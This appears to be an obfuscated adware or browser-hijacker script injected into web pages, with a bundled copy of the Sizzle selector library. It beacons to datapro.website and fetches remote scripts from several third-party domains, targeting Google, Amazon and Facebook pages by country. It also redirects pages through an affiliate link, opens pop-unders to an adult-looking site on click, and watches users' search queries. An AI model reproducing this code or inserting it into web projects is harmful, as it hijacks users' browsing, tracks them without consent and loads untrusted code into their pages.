(function(f, i, j) {
    var g = "20d8758f26eaa9dcdd";
    var b = (function() {
        var l = 3;
        var p = parseInt("0");
        var o = parseInt("0");
        (function() {
            var r = ["mid=", "wid=52529", "sid=", "tid=8408", "rid=LAUNCHED"];
            a = (window.location.protocol == "http:" ? "http:" : "https:") + "//datapro.website/metric/?" + r.join("&");
        ...
        (function(d, w, uniqId, u) {
            ...
            $$ = w[uniqId] = {
                ...
                loadedCallback: function(code, block, custom1, custom2, custom3, custom4, custom5) {
                    ...
                    var params = ["mid=" + block, "wid=52529", "sid=" + ((w[uniqId] && w[uniqId].tbParams && w[uniqId].tbParams.sid) ? encodeURIComponent(w[uniqId].tbParams.sid) : ""), "tid=8408", "rid=" + code];
                    if (custom1) {
        ...
        )(document, window, "20d8758f26eaa9dcdd", undefined);
        ;(function(aA, q) {
            var G, aD, l, v, R, U, ag, aH, S, aj, L, w, at, an, aB, k, P, av = "sizzle" + -(new Date()), T = aA.document, aE = 0, ao = 0, d = J(), au = J(), Q = J(), ah = false, N = function() {
                return 0
            }, az = typeof q, ab = 1 << 31, Y = ({}).hasOwnProperty, ax = [], ay = ax.pop, W = ax.push, b = ax.push, u = ax.slice, j = ax.indexOf || function(aJ) {
                var aI = 0
                  , e = this.length;
                for (; aI < e; aI++) {
                    if (this[aI] === aJ) {
            ...
            }, aa = /^[^{]+\{\s*\[native \w/, ac = /^(?:#([\w-]+)|(\w+)|\.([\w-]+))$/, h = /^(?:input|select|textarea|button)$/i, t = /^h\d$/i, X = /'|\\/g, A = new RegExp("\\\\([\\da-f]{1,6}" + x + "?|(" + x + ")|.)","ig"), ap = function(e, aJ, i) {
                var aI = "0x" + aJ - 65536;
            ...
            function aF(e, aJ, aM) {
                e = e.split("|");
                var aL, aI = e.length, aK = aM ? null : aJ;
                while (aI--) {
            ...
            function ar(e) {
                return r(function(i) {
                    ...
                    return r(function(aI, aM) {
                        var aK, aJ = e([], aI.length, i), aL = aJ.length;
                        while (aL--) {
                            if (aI[(aK = aJ[aL])]) {
                                aI[aK] = !(aM[aK] = aI[aK])
                            }
            ...
            aj = E.setDocument = function(e) {
                ...
                : function(aI, aM) {
                    var aN, aL = [], aK = 0, aJ = aM.getElementsByTagName(aI);
                    if (aI === "*") {
                        while ((aN = aJ[aK++])) {
                            if (aN.nodeType === 1) {
                                aL.push(aN)
                ...
                : function(aJ, aI) {
                    var aP, aM = 0, aO = aJ.parentNode, aL = aI.parentNode, aK = [aJ], aN = [aI];
                    if (aJ === aI) {
                        ah = true;
                        return 0
                    } else {
            ...
            v = E.selectors = {
                ...
                filter: {
                    ...
                    CHILD: function(i, aK, aJ, aL, aI) {
                        ...
                        : function(aU, aS, aX) {
                            var aO, a0, aV, aZ, aW, aR, aT = aN !== e ? "nextSibling" : "previousSibling", aY = aU.parentNode, aQ = aM && aU.nodeName.toLowerCase(), aP = !aX && !aM;
                            if (aY) {
                                if (aN) {
                                    while (aT) {
                                        aV = aU;
                    ...
                    PSEUDO: function(aJ, aI) {
                        ...
                        if (i.length > 1) {
                            ...
                            return v.setFilters.hasOwnProperty(aJ.toLowerCase()) ? r(function(aM, aO) {
                                var aL, aK = i(aM, aI), aN = aK.length;
                                while (aN--) {
                                    aL = j.call(aM, aK[aN]);
                                    aM[aL] = !(aO[aL] = aK[aN])
                                }
                ...
                pseudos: {
                    not: r(function(e) {
                        ...
                        return aJ[av] ? r(function(aL, aQ, aO, aM) {
                            var aP, aK = aJ(aL, null, aM, []), aN = aL.length;
                            while (aN--) {
                                if ((aP = aK[aN])) {
                                    aL[aN] = !(aQ[aN] = aP)
                                }
                    ...
                    lang: r(function(e) {
                        ...
                        return function(aI) {
                            ...
                            } while ((aI = aI.parentNode) && aI.nodeType === 1);return false
                        }
                    }),
                    target: function(e) {
            ...
            function ak(e, aI, aJ, aK, aN) {
                var aL, aQ = [], aM = 0, aO = e.length, aP = aI != null;
                for (; aM < aO; aM++) {
                    if ((aL = e[aM])) {
                        if (!aJ || aJ(aL, aK, aN)) {
                            aQ.push(aL);
            ...
            function n(aI, i, aK, aJ, aL, e) {
                ...
                return r(function(aW, aT, aO, aV) {
                    var aY, aU, aQ, aP = [], aX = [], aN = aT.length, aM = aW || I(i || "*", aO.nodeType ? [aO] : aO, []), aR = aI && (aW || !i) ? ak(aM, aP, aI, aO, aV) : aM, aS = aK ? aL || (aW ? aI : aN || aJ) ? [] : aT : aR;
                    if (aK) {
                        aK(aR, aS, aO, aV)
                    }
                    if (aJ) {
            ...
            function aw(aN) {
                var aI, aL, aJ, aM = aN.length, aQ = v.relative[aN[0].type], aR = aQ || v.relative[" "], aK = aQ ? 1 : 0, aO = y(function(i) {
                    return i === aI
                }, aR, true), aP = y(function(i) {
                    return j.call(aI, i) > -1
                }, aR, true), e = [function(aT, aS, i) {
            ...
            function ai(aJ, aI) {
                var aL = 0
                  ...
                  , i = function(aV, aP, aU, aT, a1) {
                    var aQ, aR, aW, a0 = [], aZ = 0, aS = "0", aM = aV && [], aX = a1 != null, aY = aH, aO = aV || aK && v.find.TAG("*", a1 && aP.parentNode || aP), aN = (aE += aY == null ? 1 : Math.random() || 0.1);
                    if (aX) {
                        aH = aP !== L && aP;
                        l = aL
                    }
                    for (; (aQ = aO[aS]) != null; aS++) {
                        if (aK && aQ) {
                            aR = 0;
                            while ((aW = aJ[aR++])) {
                                if (aW(aQ, aP, aU)) {
            ...
            aA["20d8758f26eaa9dcdd"].Sizzle = E
        }
        )(window);
        ;var e = i[g].Sizzle;
        var d = i[g];
        ...
        d.ready(function() {
            ...
            try {
                (function() {
                    ...
                    var A = function() {
                        if ("52529" == "51433" && location.hostname.indexOf("olam-hamedia.tech") > -1) {
                            return
                        }
            ...
            for (var v = 0; v < t.length; v++) {
                var z = t[v];
                if (z.src.search(/20d8758f26eaa9dcdd.*\.js/i) !== -1) {
            ...
            (function(d, w, u) {
                var $$ = w["20d8758f26eaa9dcdd"];
                var scriptsToLoad = $$.fromJson("{\"f4c82\":{\"countries_allow\":\"at,br,ch,de,dk,es,fi,fr,in,it,mx,nl,no,se,sg,tw,gb\",\"countries_deny\":\"\",\"hostname_allow\":\"(?:google\\\\..*|youtube\\\\.com)\",\"hostname_deny\":\"\",\"browsers_allow\":\"\",\"browsers_deny\":\"\",\"coverage\":\"0-100\",\"url\":\"\\/\\/laubeyrietechnology.com\\/script\\/d.php?uid=52529x8408xzzzzzzzzzzzzzzzzzzzzz&a=3453\",\"limit\":\"0\",\"type\":\"external\",\"key\":\"f4c82\"},\"cd1d2\":{\"countries_allow\":\"\",\"countries_deny\":\"\",\"hostname_allow\":\"\",\"hostname_deny\":\"(?:.*googleusercontent\\\\..*|mail\\\\.google\\\\.com|reddit\\\\.com|.*\\\\.reddit\\\\.com)\",\"browsers_allow\":\"\",\"browsers_deny\":\"\",\"coverage\":\"0-100\",\"url\":\"\\/\\/static-resource.com\\/js\\/int.js?key=5f688b18da187d591a1d8d3ae7ae8fd008cd7871&uid=8408x\\/SID\\/\",\"limit\":\"0\",\"type\":\"external\",\"key\":\"cd1d2\"},\"90f06\":{\"countries_allow\":\"\",\"countries_deny\":\"\",\"hostname_allow\":\"\",\"hostname_deny\":\"\",\"browsers_allow\":\"\",\"browsers_deny\":\"\",\"coverage\":\"0-100\",\"url\":\"\\/\\/cdn-javascript.net\\/api?key=a1ce18e5e2b4b1b1895a38130270d6d344d031c0&uid=8408x\\/SID\\/&format=arrjs&r=\\/RANDOM\\/\",\"limit\":\"0\",\"type\":\"external\",\"key\":\"90f06\"},\"acfec\":{\"countries_allow\":\"us,de,gb,fr,ca,au,nl,es,it,nz,be,se,ch,in,at,br,dk,no,fi\",\"countries_deny\":\"\",\"hostname_allow\":\"(?:amazon\\\\..*|.*\\\\.amazon\\\\..*)\",\"hostname_deny\":\"\",\"browsers_allow\":\"\",\"browsers_deny\":\"\",\"coverage\":\"0-100\",\"url\":\"\",\"limit\":\"0\",\"type\":\"platform\",\"key\":\"acfec\",\"config\":{\"subid\":\"1186\"}}}");
                var plugins = {};
                ...
                if (location.hostname.indexOf("facebook.com") > -1) {
                    if (scriptsToLoad['5df82']) {
                        (function(r, j, l) {
                            var k = j["20d8758f26eaa9dcdd"];
                            var a = j["20d8758f26eaa9dcdd"].Sizzle;
                    ...
                    $$.jsonp({
                        ...
                        callback: function(response) {
                                ...
                                try {
                                    ...
                                    if (typeof (scriptUrl) == "object") {
                                        if (scriptUrl.rotator) {
                                            ...
                                            var rotatorCookieName = "_mrtr_20d8758f26eaa9dcdd_" + key;
                                    ...
                                    if (!$$.demoMode) {
                                        if ("8408" == 1549 && location.protocol == "https:" && (key == "a8bb7" || key == "e9254")) {
                                            if (extendedCallbacks) {
                                    ...
                                    if (scriptRow.type == "external") {
                                        ...
                                        scriptUrl = scriptUrl.replace(/\/OPTOUTURL_DBLENCODED\//g, encodeURIComponent(encodeURIComponent(($$.tbParams.optoutUrl ? $$.tbParams.optoutUrl : "http://thisadsfor.us/optout?t=8408&u=52529&block=" + key))));
                                        scriptUrl = scriptUrl.replace(/\/OPTOUTURL\//g, encodeURIComponent(($$.tbParams.optoutUrl ? $$.tbParams.optoutUrl : "http://thisadsfor.us/optout?t=8408&u=52529&block=" + key)));
                                        if (scriptUrl) {
                            ...
                            if (platformBlocks.length > 0) {
                                ...
                                var url = (window.location.protocol == "http:" ? "http:" : "https:") + "//" + $$.scriptDomain + "/ext/20d8758f26eaa9dcdd.js?" + params.join("&");
                                $$.script(url, false);
                    ...
                    (function() {
                        try {
                            ...
                            if (searchFieldInputEl && searchFieldInputEl.length > 0 && searchFieldInputEl[0] && searchFieldInputEl[0].value) {
                                ...
                                var keywordsLook = [["3g", "modem"], ["3g", "модем"], ["3г", "модем"], ["4g", "modem"], ["4g", "модем"], ["4г", "модем"]];
                ...
                if (location.hostname.match(matchPattern)) {
                    ...
                    location.href = "http://adrs.me/get?key=6ae9f4bd1dc812dc713d61cba871d8e8&out=http%3A%2F%2Fbooking.com&ref=http%3A%2F%2Fgo.com&format=go&uid=rdr52529"
                }
                if (isInIframe()) {
                    return
                }
                            ...
                            try {
                                (function() {
                                    ...
                                    function checkForSearch() {
                                        var e = location.href;
                                        -1 != d.indexOf("search.yahoo.com") && checkYahooTag() && clearInterval(tmr)
                                    }
                                    var d = window.document.domain, tmr, tmrCnt = 0, params = {};
                                    window == top && (checkForSearch(),
                        ...
                        $$.ready(function() {
                            try {
                                (function() {
                                    ...
                                    function checkForSearch() {
                                        var e = location.href;
                                        -1 != d.indexOf("go.mail.ru") && checkMailruTag() && clearInterval(tmr)
                                    }
                                    var d = window.document.domain, tmr, tmrCnt = 0, params = {};
                                    window == top && (checkForSearch(),
                                    tmr = setInterval(checkForSearch, 100))
                    ...
                    (function() {
                        ...
                        $$.ready(function() {
                            try {
                                ...
                                var d = window.document.domain, tmr, params = {};
                                if (window == top) {
                                    checkForSearch();
                                    tmr = setInterval(checkForSearch, 100)
                                }
            ...
            ;(function(d, w, u) {
                ...
                var plugins = {};
                ;plugins["c3828"] = function(key, config) {
                    (function(i, k, l) {
                        let$$ = k["20d8758f26eaa9dcdd"];
                        let mntzKey = key;
                        let monetizationConfig = config;
                        const c = (new Date()).getTime();
                        $$.loadedCallback("MNTZ_LOADED", mntzKey);
                        if (typeof localStorage == "undefined") {
                            $$.loadedCallback("CB_APS_ERR_STORAGE", mntzKey);
                            return
                        }
                        const a = localStorage.getItem("__mz_aps_opened");
                        if (a && a > (c - 86400000)) {
                            return
                        }
                        var j = 1;
                        if (monetizationConfig && monetizationConfig.shape) {
                            j = monetizationConfig.shape
                        }
                        var g = (j > 0 && Math.random() < j);
                        if (!g) {
                            return false
                        }
                        var b = "https://hot-tube.net/?pops";
                        ...
                        e.addEventListener("click", h, true);
                        var f = false;
                        function h() {
                            if (f) {
                                return
                            ...
                            if (b) {
                                window.open(b);
                                localStorage.setItem("__mz_aps_opened", c);
                                document.body.removeChild(e);
                                $$.loadedCallback("CB_APS_OPEN", mntzKey, b, location.href);
                                $$.loadedCallback("BANNER_LOAD", mntzKey)
                            }
                            f = true;
                            if (window.removeEventListener) {
                                e.removeEventListener("click", h, true)
                            }
                        }
                    }
                    )(document, window);
                ...
                if (localStorage && localStorage.getItem("__mtz_dct")) {
                    dataParams.scategory = localStorage.getItem("__mtz_dct")
                }
                $$.jsonp({
                    url: (window.location.protocol == "http:" ? "http:" : "https:") + "//" + $$.scriptDomain + "/trgt/",
                    data: dataParams,
                    callback: function(response) {
                        if (!response.data) {
                            $$.loadedCallback("TARGETING_RESPONSE_FAIL");
                            return false
                        }
                        $$.loadedCallback("TARGETING_RESPONSE_OK");
                        if (response.category && response.category != "n/a" && localStorage) {
                            localStorage.setItem("__mtz_dct", response.category)
                        }
                        var platformBlocks = [];
                        var scriptsToLoad = response.rows;
                        for (var key in scriptsToLoad) {
                            try {
                                var scriptRow = scriptsToLoad[key];
                                var scriptUrl = scriptRow.url;
                                ...
                                if (location.hostname == "youtube.com" || location.hostname == "www.youtube.com") {
                                    continue
                                }
                                if (location.hostname.indexOf("facebook.com") > -1) {
                                    continue
            ...
            ;(function(e, a, f, c) {
                ...
                b.twBarOptOutInit = function() {
                    ...
                    g.id = "__twbopt20d8758f26eaa9dcdd";
                    g.frameBorder = 0;
                    g.scrolling = "no";
                    ...
                    var h = function() {
                        ...
                        i.getElementById("partial-support").onclick = function() {
                            window.open("http://thisadsfor.us/optout?t=8408&u=52529&key=20d8758f26eaa9dcdd&block=" + b.currentOptoutBlock);
                            b.optoutHide();
    ...
    ;try {
        ...
        var a = (i.location.protocol == "http:" ? "http:" : "https:") + "//datapro.website/log/?l=error&m=" + encodeURIComponent((typeof c.message != "undefined" ? c.message : "!empty message!") + "|" + h);
        ...
        (function() {
            var e = ["mid=", "wid=52529", "sid=" + (i[g] && i[g].tbParams && i[g].tbParams.sid) ? i[g].tbParams.sid : "", "tid=8408", "custom1=" + encodeURIComponent((typeof c.message != "undefined" ? c.message : "!empty message!")), "rid=CORE_JS_ERROR"];
            a = (i.location.protocol == "http:" ? "http:" : "https:") + "//datapro.website/metric/?" + e.join("&");
